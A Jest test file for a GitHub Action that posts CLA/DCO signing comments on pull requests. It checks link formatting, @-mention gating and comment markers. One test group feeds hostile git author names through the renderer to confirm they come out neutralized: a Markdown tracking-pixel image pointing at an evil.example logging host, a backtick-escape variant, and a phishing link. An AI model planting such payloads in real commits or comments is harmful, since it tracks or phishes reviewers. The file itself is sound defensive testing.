/**
 * Tests for src/pullrequest/pullRequestCommentContent.ts
 *
 * Cover three M2 bugs that all live in the rendered comment text:
 *  - BUG-MARKDOWN-LINK: signed-committer link was `(name)[url]` instead of `[name](url)`
 *  - BUG-AT-MENTION-GHOST: unsigned committer with no GitHub user id should not be @-mentioned
 *  - sanity: signed/all-signed branches still produce the expected bot signature
 */
import { commentContent, commentMarker } from '../src/pullrequest/pullRequestCommentContent'
import { CommitterMap } from '../src/interfaces'
import * as input from '../src/shared/getInputs'

jest.mock('@actions/core')

jest.mock('../src/shared/getInputs', () => ({
  getUseDcoFlag: jest.fn(() => 'false'),
  getCustomNotSignedPrComment: jest.fn(() => ''),
  getCustomAllSignedPrComment: jest.fn(() => ''),
  getCustomPrSignComment: jest.fn(() => ''),
  getPathToDocument: jest.fn(() => 'https://example.com/CLA.md'),
  suggestRecheck: jest.fn(() => 'false')
}))

const mockedInput = jest.mocked(input)

function makeMap(over: Partial<CommitterMap> = {}): CommitterMap {
  return { signed: [], notSigned: [], unknown: [], ...over }
}

describe('commentContent — CLA branch', () => {
  beforeEach(() => {
    mockedInput.getUseDcoFlag.mockReturnValue('false')
  })

  describe('BUG-MARKDOWN-LINK (#67 / PR #171)', () => {
    it('renders signed committers as proper Markdown links, not the inverted (text)[url] form', () => {
      const map = makeMap({
        signed: [{ name: 'alice', id: 1 }],
        notSigned: [{ name: 'bob', id: 2 }]
      })

      const out = commentContent(false, map)

      // The committer-list line only renders when count > 1.
      expect(out).toContain(':white_check_mark: [alice](https://github.com/alice)')
      // The inverted form must not appear.
      expect(out).not.toContain('(alice)[https://github.com/alice]')
    })
  })

  describe('BUG-AT-MENTION-GHOST (#177, #91)', () => {
    it('@-mentions unsigned committers who have a resolved GitHub user id', () => {
      const map = makeMap({
        signed: [{ name: 'alice', id: 1 }],
        notSigned: [{ name: 'bob', id: 42 }]
      })

      const out = commentContent(false, map)

      expect(out).toContain(':x: @bob')
    })

    it('does NOT @-mention unsigned committers when id is missing (raw git author name)', () => {
      // graphql.ts assigns id `''` when no GitHub user could be matched to the
      // commit author — the name then comes from the raw git author name and
      // @-prefixing it can ping an unrelated GitHub login that happens to
      // match. The fix: render the name without `@` in that case, AND wrap
      // it in backticks to neutralize Markdown (SEC-ESCAPE-AUTHOR-NAME).
      const map = makeMap({
        signed: [{ name: 'alice', id: 1 }],
        notSigned: [{ name: 'random-name', id: 0 as any }] // id absent
      })

      const out = commentContent(false, map)

      expect(out).toContain(':x: `random-name`')
      expect(out).not.toContain('@random-name')
    })
  })

  describe('SEC-ESCAPE-AUTHOR-NAME: unresolved git author names are neutralized', () => {
    it('neutralizes a Markdown image embed in an unresolved committer name', () => {
      // Attack: PR opener commits with author name `![pixel](https://evil/log)`.
      // Without escaping, GitHub renders the image and exfiltrates reviewer IPs.
      const malicious = '![pixel](https://evil.example/log?pr=1)'
      const map = makeMap({
        notSigned: [
          { name: 'alice', id: 1 }, // pad to trigger committer-list rendering
          { name: malicious, id: 0 as any }
        ]
      })

      const out = commentContent(false, map)

      // The raw image markdown must not appear unwrapped — backticks must
      // bracket it so it renders as inline code.
      expect(out).toContain(`:x: \`${malicious}\``)
      expect(out).not.toMatch(/:x: !\[pixel\]/)
    })

    it('strips embedded backticks from the unresolved name to prevent wrapper escape', () => {
      // Naive `'\`' + name + '\`'` wrap is escapable if the name itself
      // contains backticks. Strip them.
      const map = makeMap({
        notSigned: [
          { name: 'alice', id: 1 },
          { name: 'evil`![pwn](https://evil)`', id: 0 as any }
        ]
      })

      const out = commentContent(false, map)

      // Embedded backticks must be stripped so the wrapper can't be escaped.
      // Wrapped form: `evil![pwn](https://evil)`. The inner backticks from
      // the malicious input are gone — only the two outer wrapping backticks
      // remain. Verify by counting backticks around the malicious sequence.
      expect(out).toContain(':x: `evil![pwn](https://evil)`')
      // Negative: the un-stripped form (`evil\`![pwn]...\`\`) would leave
      // a backtick run that can prematurely close the wrap.
      expect(out).not.toContain('evil`!')
    })

    it('neutralizes Markdown in the "unknown" committer bucket', () => {
      const map = makeMap({
        unknown: [{ name: '[click here](https://phish.example)', id: 0 as any }]
      })

      const out = commentContent(false, map)

      expect(out).toContain('`[click here](https://phish.example)`')
      // raw clickable link must not appear unwrapped
      expect(out).not.toMatch(/\*\*\[click here\]/)
    })

    it('leaves resolved-GitHub-user names unescaped (login is alphanumeric+hyphen)', () => {
      // Belt-and-suspenders: when the committer has a real id, the name we
      // use is `login` which GitHub guarantees is safe. Don't backtick-wrap
      // it — the @-mention would otherwise render as inline-code literal.
      const map = makeMap({
        notSigned: [
          { name: 'alice', id: 1 },
          { name: 'real-login', id: 42 }
        ]
      })

      const out = commentContent(false, map)

      expect(out).toContain(':x: @real-login')
      expect(out).not.toContain('`real-login`')
    })
  })

  describe('signed branches', () => {
    it('renders the CLA all-signed footer with the v3 brand', () => {
      const out = commentContent(true, makeMap())
      expect(out).toContain('All contributors have signed the CLA')
      expect(out).toContain('Self-Hosted CLA Assistant bot')
    })
  })

  describe('FEAT-PATH-VAR-IN-COMMENT (#113): $pathToDocument substitution in custom template', () => {
    it('substitutes $pathToDocument in a user-provided custom-notsigned-prcomment', () => {
      mockedInput.getCustomNotSignedPrComment.mockReturnValue(
        'Please sign the agreement at $pathToDocument before $you can merge.'
      )
      const out = commentContent(
        false,
        makeMap({ notSigned: [{ name: 'alice', id: 1 }] })
      )
      expect(out).toContain('Please sign the agreement at https://example.com/CLA.md before you can merge.')
      // $you also substitutes alongside $pathToDocument.
      expect(out).not.toContain('$you')
      expect(out).not.toContain('$pathToDocument')
    })

    it('substitutes every occurrence of $pathToDocument', () => {
      mockedInput.getCustomNotSignedPrComment.mockReturnValue(
        'see $pathToDocument and $pathToDocument again'
      )
      const out = commentContent(
        false,
        makeMap({ notSigned: [{ name: 'alice', id: 1 }] })
      )
      expect(out).toContain(
        'see https://example.com/CLA.md and https://example.com/CLA.md again'
      )
    })
  })
})

describe('commentContent — DCO branch', () => {
  beforeEach(() => {
    mockedInput.getUseDcoFlag.mockReturnValue('true')
  })

  it('also fixes the Markdown link in the DCO branch (parity with CLA)', () => {
    const map = makeMap({
      signed: [{ name: 'carol', id: 3 }],
      notSigned: [{ name: 'dan', id: 4 }]
    })
    const out = commentContent(false, map)
    expect(out).toContain(':white_check_mark: [carol](https://github.com/carol)')
    expect(out).not.toContain('(carol)[https://github.com/carol]')
  })

  it('also gates the @-mention in the DCO branch (parity with CLA)', () => {
    const map = makeMap({
      signed: [{ name: 'carol', id: 3 }],
      notSigned: [{ name: 'ghost', id: 0 as any }]
    })
    const out = commentContent(false, map)
    expect(out).toContain(':x: `ghost`')
    expect(out).not.toContain('@ghost')
  })

  it('renders the DCO all-signed footer with the v3 brand', () => {
    const out = commentContent(true, makeMap())
    expect(out).toContain('All contributors have signed the DCO')
    expect(out).toContain('Self-Hosted DCO Assistant bot')
  })
})

describe('commentMarker (BUG-COMMENT-MARKER / upstream #153)', () => {
  const origWorkflow = process.env.GITHUB_WORKFLOW
  const origJob = process.env.GITHUB_JOB

  afterEach(() => {
    process.env.GITHUB_WORKFLOW = origWorkflow
    process.env.GITHUB_JOB = origJob
    mockedInput.getUseDcoFlag.mockReturnValue('false')
  })

  it('embeds workflow + job names so two CLA jobs in one repo can be told apart', () => {
    process.env.GITHUB_WORKFLOW = 'CLA-frontend'
    process.env.GITHUB_JOB = 'sign-check'
    expect(commentMarker('cla')).toBe(
      '<!-- cla-lite-bot:cla:CLA-frontend:sign-check -->'
    )
  })

  it('falls back to "default" when the runner env vars are missing', () => {
    delete process.env.GITHUB_WORKFLOW
    delete process.env.GITHUB_JOB
    expect(commentMarker('cla')).toBe(
      '<!-- cla-lite-bot:cla:default:default -->'
    )
  })

  it('discriminates CLA vs DCO mode in the marker', () => {
    process.env.GITHUB_WORKFLOW = 'wf'
    process.env.GITHUB_JOB = 'job'
    expect(commentMarker('dco')).toBe('<!-- cla-lite-bot:dco:wf:job -->')
  })

  it('every rendered comment contains the marker', () => {
    process.env.GITHUB_WORKFLOW = 'wf'
    process.env.GITHUB_JOB = 'job'
    const out = commentContent(false, makeMap({ notSigned: [{ name: 'alice', id: 1 }] }))
    expect(out).toContain('<!-- cla-lite-bot:cla:wf:job -->')
  })
})

describe('full-comment snapshots (regression detection)', () => {
  // These snapshots catch byte-level drift in the rendered comment, which
  // matters because consumers see this text on every PR and changes to the
  // shape can break downstream regexes / dashboards / archived PRs.
  //
  // If a snapshot here intentionally changes, update it deliberately and
  // note the rationale in CHANGELOG.

  const origWorkflow = process.env.GITHUB_WORKFLOW
  const origJob = process.env.GITHUB_JOB

  beforeEach(() => {
    // Deterministic marker for snapshots.
    process.env.GITHUB_WORKFLOW = 'wf'
    process.env.GITHUB_JOB = 'job'
    mockedInput.getUseDcoFlag.mockReturnValue('false')
    mockedInput.getCustomNotSignedPrComment.mockReturnValue('')
    mockedInput.getCustomAllSignedPrComment.mockReturnValue('')
    mockedInput.getCustomPrSignComment.mockReturnValue('')
    mockedInput.suggestRecheck.mockReturnValue('false')
  })

  afterAll(() => {
    process.env.GITHUB_WORKFLOW = origWorkflow
    process.env.GITHUB_JOB = origJob
  })

  it('CLA — multi-committer, one signed one not', () => {
    const map = makeMap({
      signed: [{ name: 'alice', id: 1 }],
      notSigned: [{ name: 'bob', id: 2 }]
    })
    expect(commentContent(false, map)).toMatchSnapshot()
  })

  it('CLA — single unsigned committer (no per-committer list)', () => {
    const map = makeMap({
      signed: [],
      notSigned: [{ name: 'alice', id: 1 }]
    })
    expect(commentContent(false, map)).toMatchSnapshot()
  })

  it('CLA — unknown committer (not a GitHub user)', () => {
    const map = makeMap({
      signed: [],
      notSigned: [{ name: 'alice', id: 1 }],
      unknown: [{ name: 'Local Git Author', id: 0 as any }]
    })
    expect(commentContent(false, map)).toMatchSnapshot()
  })

  it('CLA — all signed', () => {
    const map = makeMap({
      signed: [
        { name: 'alice', id: 1 },
        { name: 'bob', id: 2 }
      ],
      notSigned: []
    })
    expect(commentContent(true, map)).toMatchSnapshot()
  })

  it('CLA — with suggest-recheck enabled', () => {
    mockedInput.suggestRecheck.mockReturnValue('true')
    const map = makeMap({
      signed: [{ name: 'alice', id: 1 }],
      notSigned: [{ name: 'bob', id: 2 }]
    })
    expect(commentContent(false, map)).toMatchSnapshot()
  })

  it('DCO — multi-committer, one signed one not', () => {
    mockedInput.getUseDcoFlag.mockReturnValue('true')
    const map = makeMap({
      signed: [{ name: 'alice', id: 1 }],
      notSigned: [{ name: 'bob', id: 2 }]
    })
    expect(commentContent(false, map)).toMatchSnapshot()
  })

  it('DCO — all signed', () => {
    mockedInput.getUseDcoFlag.mockReturnValue('true')
    const map = makeMap({
      signed: [{ name: 'alice', id: 1 }],
      notSigned: []
    })
    expect(commentContent(true, map)).toMatchSnapshot()
  })
})
